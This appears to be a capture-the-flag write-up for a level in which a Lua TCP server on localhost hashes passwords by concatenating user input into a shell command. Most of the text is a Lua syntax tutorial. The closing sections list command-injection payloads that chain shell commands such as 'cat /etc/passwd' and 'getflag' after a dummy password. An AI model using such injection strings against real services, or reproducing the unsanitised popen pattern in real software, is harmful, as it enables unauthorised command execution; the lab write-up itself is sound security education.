# 📜 Level11 Writeup
## Level Overview
**Category:** Remote Exploitation / Command Injection
**Description:**
We are given a Lua socket server running on **127.0.0.1:5151**. The server accepts a password and compares its SHA1 hash to a hardcoded value. If the hash matches, the user "wins." However, the hashing function uses insecure shell execution, which opens the door to command injection and allows arbitrary command execution on the box.
The whole script is pointless and does not have a point except being exploited
cause even if you got the hash cracked. the password will not work either way and even if it did it wil only print a dump message

## Lua Script Analysis

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

## Lua Syntax Breakdown with Examples

### 1. **Shebang and Module Loading**
```lua
#!/usr/bin/env lua                    -- Shebang: tells system to use lua interpreter
local socket = require("socket")      -- Import socket library for network operations
```

**Example**: Similar to Python's `import socket`
```lua
-- Lua module loading
local json = require("json")          -- Load JSON library
local math = require("math")          -- Load math library (though usually built-in)
```

### 2. **Variable Declarations and Scope**
```lua
local server = assert(socket.bind("127.0.0.1", 5151))
```

**Breakdown**:
- `local`: Creates a local variable (limited scope)
- `assert()`: Throws error if the expression is false/nil
- `socket.bind()`: Creates a server socket

**Examples**:
```lua
local name = "Alice"                  -- Local string variable
global_var = "Bob"                    -- Global variable (no 'local' keyword)
local x, y = 10, 20                   -- Multiple assignment
local result = assert(math.sqrt(16))  -- result = 4, or error if sqrt fails
```

### 3. **Function Definition**
```lua
function hash(pass)
  -- function body
  return data
end
```

**Examples**:
```lua
-- Basic function
function greet(name)
    return "Hello " .. name
end

-- Function with multiple parameters
function add(x, y)
    return x + y
end

-- Local function
local function multiply(a, b)
    return a * b
end

print(greet("World"))        -- Output: Hello World
print(add(5, 3))             -- Output: 8
print(multiply(4, 7))        -- Output: 28
```

### 4. **String Concatenation**
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

**Breakdown**:
- `..` is Lua's string concatenation operator
- This creates: `"echo " + pass + " | sha1sum"`

**Examples**:
```lua
local first = "Hello"
local last = "World"
local full = first .. " " .. last     -- "Hello World"

local num = 42
local text = "Answer: " .. num        -- "Answer: 42" (automatic conversion)

-- Multiple concatenations
local cmd = "ls " .. "-la " .. "/tmp"  -- "ls -la /tmp"
```

### 5. **Process Execution with io.popen()**
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
data = prog:read("*all")
prog:close()
```

**Breakdown**:
- `io.popen(command, mode)`: Execute shell command and return file handle
- `"r"`: Read mode (can also be "w" for write)
- `prog:read("*all")`: Read all output from the command
- `prog:close()`: Close the file handle

**Examples**:
```lua
-- Execute a command and read output
local proc = io.popen("date", "r")
local current_time = proc:read("*all")
proc:close()
print("Current time:", current_time)

-- List directory contents
local proc = io.popen("ls -la", "r")
local files = proc:read("*all")
proc:close()
print(files)

-- Get system information
local proc = io.popen("uname -a", "r")
local system_info = proc:read("*all")
proc:close()
```

### 6. **String Manipulation**
```lua
data = string.sub(data, 1, 40)
```

**Breakdown**:
- `string.sub(string, start, end)`: Extract substring
- `1, 40`: Get characters from position 1 to 40 (SHA1 hash length)

**Examples**:
```lua
local text = "Hello World 123"
print(string.sub(text, 1, 5))        -- "Hello"
print(string.sub(text, 7, 11))       -- "World"
print(string.sub(text, -3))          -- "123" (negative index from end)

-- Other string functions
print(string.len(text))               -- 15
print(string.upper(text))             -- "HELLO WORLD 123"
print(string.lower(text))             -- "hello world 123"
print(string.find(text, "World"))     -- 7, 11 (start and end positions)
```

### 7. **Infinite Loops and Control Flow**
```lua
while 1 do
  -- loop body
end
```

**Breakdown**:
- `while 1 do`: Infinite loop (1 is truthy in Lua)
- `do...end`: Block delimiter

**Examples**:
```lua
-- Different loop types
local i = 1
while i <= 5 do
    print("Count:", i)
    i = i + 1
end

-- For loop
for i = 1, 5 do
    print("Number:", i)
end

-- For loop with step
for i = 10, 1, -1 do
    print("Countdown:", i)
end

-- Infinite loop with break
while true do
    local input = io.read()
    if input == "quit" then
        break
    end
    print("You said:", input)
end
```

### 8. **Socket Operations**
```lua
local client = server:accept()        -- Wait for client connection
client:send("Password: ")             -- Send data to client
client:settimeout(60)                 -- Set 60 second timeout
local l, err = client:receive()       -- Receive data from client
client:close()                        -- Close connection
```

**Examples**:
```lua
-- Basic socket server pattern
local socket = require("socket")
local server = socket.bind("*", 8080)

while true do
    local client = server:accept()
    client:send("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello!")
    client:close()
end

-- Socket client example
local client = socket.connect("google.com", 80)
client:send("GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")
local response = client:receive("*all")
client:close()
print(response)
```

### 9. **Conditional Statements**
```lua
if not err then
    -- do something
else
    -- handle error
end
```

**Examples**:
```lua
local age = 18

if age >= 18 then
    print("Adult")
elseif age >= 13 then
    print("Teenager")
else
    print("Child")
end

-- Logical operators
local user = "admin"
local pass = "secret"

if user == "admin" and pass == "secret" then
    print("Access granted")
else
    print("Access denied")
end

-- Nil checking
local value = nil
if not value then
    print("Value is nil or false")
end
```

### 10. **String Comparison and Hash Checking**
```lua
if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
    client:send("Erf nope..\n");
else
    client:send("Gz you dumb*\n")
end
```

**Examples**:
```lua
-- String comparisons
local input = "password123"
local expected = "secretkey"

if input == expected then
    print("Match!")
else
    print("No match")
end

-- Case-sensitive comparison
print("ABC" == "abc")         -- false
print("ABC" == "ABC")         -- true

-- Pattern matching
local email = "user@example.com"
if string.match(email, "@") then
    print("Valid email format")
end
```

## Observations
* The server is written in Lua and listens on port 5151.
* It asks for a password over a TCP connection.
* The password is hashed via sha1sum using io.popen:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```
* This concatenates user input directly into a shell command.

Running the server and connecting via netcat:
```bash
$ nc 127.0.0.1 5151
Password: test123
Erf nope..
```
Clearly, the password check fails.

## Identifying the Vulnerability

The critical vulnerability is in the `hash()` function's unsafe string concatenation:

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

**What happens:**
- User input `pass` is directly concatenated into the shell command
- No sanitization or escaping is performed
- The resulting command is executed via `io.popen()`

**Example of dangerous concatenation:**
```lua
-- If pass = "hello; ls"
-- The command becomes: "echo hello; ls | sha1sum"
-- Which executes: echo hello; then ls; then pipes to sha1sum

-- If pass = "hello && cat /etc/passwd"  
-- The command becomes: "echo hello && cat /etc/passwd | sha1sum"
-- Which executes: echo hello AND cat /etc/passwd
```

The issue lies in unsanitized input passed into the shell.
The command looks like:
```bash
echo <input> | sha1sum
```
If we inject `;` or `&&`, we can chain additional commands.
```bash
Password: abc; ls
```
Which executes:
```bash
echo abc; ls | sha1sum
```
Confirming command injection.
![image1](./image1.png)



## Exploitation
The strategy is simple:
1. Connect to the server
2. Inject a command after the password input.
3. run the getflag command as flag11 and past it in a file

**Payload examples:**
```bash
# Basic command injection
Password: dummy; getflag > /tmp/flag

# Using && (AND operator)
Password: dummy && getflag

# Multiple commands
Password: dummy; whoami; id; getflag

# File operations
Password: dummy; cat /etc/passwd; getflag
```

![image2](./image2.png)
